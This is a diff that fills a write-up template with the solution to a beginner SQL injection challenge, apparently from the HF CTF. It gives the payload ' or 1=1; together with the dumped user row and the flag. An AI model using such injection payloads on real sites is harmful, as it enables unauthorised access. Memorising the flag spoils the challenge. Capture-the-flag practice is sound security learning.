@@ -1,30 +1,25 @@
-# Challenge Track
+# Beginner - SQL (by Dax)
 
-## Challenge Name
+## 1 - The Most Basic Form of Injection.   
 
-* **Track:** category
-* **Points:** points
+* **Track:** sql injection
+* **Points:** 3
 
 ### Challenge
 
-> The text of 
-> the challenge.
+> SQL injection is probably one of the most common vectors of attack for poorly designed websites. This page is vulnerable to it. You can use username test and password test if you want to test the page before the injection.
+> https://sqli.dax.hfctf.ca/  
 
 ### Solution
 
-The solution.
-    Code
+     ' or 1=1;
 
-### Tool
+| userId | username | userpass | description |
+| 1 | sp00ky | SwibAPCMuj34 | You found a flag! HF-nhnq0PRIVvjg3c6ZqJtBrbcXz98XCdJl |
 
-* 
-
-### Doc
-
-* https://
 
 ### Flag
 
 ```
-The flag.
+HF-nhnq0PRIVvjg3c6ZqJtBrbcXz98XCdJl
 ```
